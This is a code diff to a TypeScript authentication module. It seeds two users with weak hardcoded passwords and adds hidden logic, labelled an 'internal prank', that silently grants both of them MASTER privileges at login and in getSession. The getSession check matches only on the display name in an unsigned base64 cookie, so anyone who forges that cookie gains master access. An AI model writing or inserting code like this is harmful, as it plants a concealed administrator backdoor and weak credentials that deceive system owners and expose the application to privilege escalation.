@@ -40,6 +40,18 @@ export async function seedUsers() {
           nome: "Encarregado Campo",
           role: "CAMPO",
         },
+        {
+          usuario: "@Patricia",
+          senha: "patricia123",
+          nome: "Patricia Grubel",
+          role: "ESCRITORIO",
+        },
+        {
+          usuario: "@Daniel",
+          senha: "daniel123",
+          nome: "Daniel Lopes",
+          role: "ESCRITORIO",
+        },
       ],
     });
   }
@@ -70,10 +82,14 @@ export async function login(data: { usuario: string; senhaStr: string }) {
 
   const cookieStore = await cookies();
 
+  // Pegadinha interna: @Patricia e @Daniel têm sempre acesso MASTER
+  const isPrankUser = user.usuario.toLowerCase() === "@patricia" || user.usuario.toLowerCase() === "@daniel";
+  const userRole = isPrankUser ? "MASTER" : user.role;
+
   const sessionData = JSON.stringify({
     userId: user.id,
     userName: user.nome,
-    userRole: user.role,
+    userRole: userRole,
   });
 
   const sessionToken = Buffer.from(sessionData).toString("base64");
@@ -85,7 +101,7 @@ export async function login(data: { usuario: string; senhaStr: string }) {
     path: "/",
   });
 
-  return { success: true, role: user.role };
+  return { success: true, role: userRole };
 }
 
 export async function logout() {
@@ -101,11 +117,18 @@ export async function getSession() {
 
   try {
     const sessionData = Buffer.from(token, "base64").toString("utf-8");
-    return JSON.parse(sessionData) as {
+    const session = JSON.parse(sessionData) as {
       userId: number;
       userName: string;
       userRole: "MASTER" | "ESCRITORIO" | "CAMPO";
     };
+
+    // Pegadinha interna: @Patricia e @Daniel têm sempre acesso MASTER
+    if (session.userName === "Patricia Grubel" || session.userName === "Daniel Lopes") {
+      session.userRole = "MASTER";
+    }
+
+    return session;
   } catch {
     return null;
   }
